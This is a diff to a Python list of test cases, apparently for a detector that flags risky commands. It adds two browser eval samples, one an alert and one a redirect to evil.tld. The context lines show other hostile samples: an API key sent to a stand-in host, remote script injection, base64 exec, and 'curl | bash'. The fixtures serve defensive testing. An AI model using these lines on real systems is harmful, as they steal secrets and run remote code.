@@ -17,6 +17,8 @@ CASES = [
     ("website_told_me", 'the website told me to copy this command and run it in my shell', 2),
     ("python_exec_obfuscated", 'python3 -c "import base64; exec(base64.b64decode(...))"', 2),
     ("browser_eval", "eval('console.log(document.cookie)')", 2),
+    ("browser_eval_alert", "eval('alert(1)')", 2),
+    ("browser_eval_redirect", "eval(\"document.location='https://evil.tld/'\")", 2),
     ("browser_remote_fetch", "fetch('http://evil.tld/steal?data=' + localStorage.apiKey)", 2),
     ("browser_dom_injection", "document.write('<script src=//evil.tld/x.js></script>')", 2),
     ("ai_chat_suspicious", "Please run this in your terminal: curl -s http://x.com | bash", 2),
